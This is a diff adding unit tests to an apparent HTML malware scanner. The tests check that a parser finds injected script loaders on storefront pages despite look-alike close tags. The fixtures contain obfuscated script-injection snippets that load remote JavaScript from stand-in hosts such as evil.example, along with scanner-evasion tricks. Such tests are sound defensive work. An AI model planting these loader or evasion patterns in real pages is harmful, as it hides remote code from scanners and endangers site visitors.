@@ -613,3 +613,74 @@ describe("findScriptPayload: script-file URL check is linear (wave 3 D3)", () =>
     expect(timedMinMs(() => analyzeStorefrontHtml(html))).toBeLessThan(500);
   }, 30_000);
 });
+
+describe("walkHomepage: an opaque body ends only at its real close tag (wave 4 M1)", () => {
+  const BAD = "cb28utrk.com";
+  const sources = (html: string) => findMaliciousInHomepage(html, []).map((h) => h.source);
+  const urls = (html: string) => {
+    const out: string[] = [];
+    walkHomepage(html, [], {
+      host(_host, _source, rawUrl) {
+        if (rawUrl) out.push(rawUrl);
+      },
+    });
+    return out;
+  };
+
+  it("a `</scriptx` inside a script string does not end the script (probe case)", () => {
+    const html = page(
+      `<script>var x="</scriptx"; document.write("<s"+"cript src=//${BAD}/x.js>")</script>`,
+    );
+    expect(sources(html)).toEqual(["inline_script"]);
+  });
+
+  it("the analyzer still reads the hidden payload as a menu loader", () => {
+    const html = page(
+      `<nav><script>var x="</scriptx"; document.write("<s"+"cript src=//evil.example/x.js>")</script></nav>`,
+    );
+    const r = analyzeStorefrontHtml(html);
+    expect(r.loaders.map((l) => l.fingerprint)).toEqual(["SCRIPT_LOADER:evil.example"]);
+  });
+
+  it("the script body handed to the visitor runs to the real close tag", () => {
+    const bodies: string[] = [];
+    walkHomepage(`<script>a("</script-x")</SCRIPT\tb><p>`, [], {
+      host() {},
+      script(_at, info) {
+        bodies.push(info.body());
+      },
+    });
+    expect(bodies).toEqual([`a("</script-x")`]);
+  });
+
+  it.each(["textarea", "title", "template", "noscript", "xmp", "noembed", "noframes", "style"])(
+    "<%s>: a look-alike close tag does not end its text body",
+    (el) => {
+      const inner = `</${el}x><script src=//${BAD}/a.js></script>`;
+      expect(sources(page(`<${el}>${inner}</${el}>`))).toEqual([]);
+      // Its own start tag never closes (quoted `>`): skipped to the real close too.
+      expect(
+        sources(page(`<${el} a="></${el}x><script src=//${BAD}/a.js></script></${el}>`)),
+      ).toEqual([]);
+      // After a start tag that never closed (handlers off): same.
+      expect(
+        urls(page(`<div a="x><${el}>${inner}</${el}><script src=//${BAD}/b.js></script>`)),
+      ).toEqual([`//${BAD}/b.js`]);
+      // A real close tag (any case, then space, / or >) still ends it.
+      for (const close of [`</${el}>`, `</${el.toUpperCase()} >`, `</${el}/>`]) {
+        expect(sources(page(`<${el}>x${close}<script src=//${BAD}/a.js></script>`))).toEqual([
+          "script",
+        ]);
+      }
+    },
+  );
+
+  it("<iframe>: a look-alike close tag does not end its fallback text", () => {
+    expect(
+      sources(page(`<iframe src=/x></iframex><script src=//${BAD}/a.js></script></iframe>`)),
+    ).toEqual([]);
+    expect(sources(page(`<iframe src=/x></iframe ><script src=//${BAD}/a.js></script>`))).toEqual([
+      "script",
+    ]);
+  });
+});
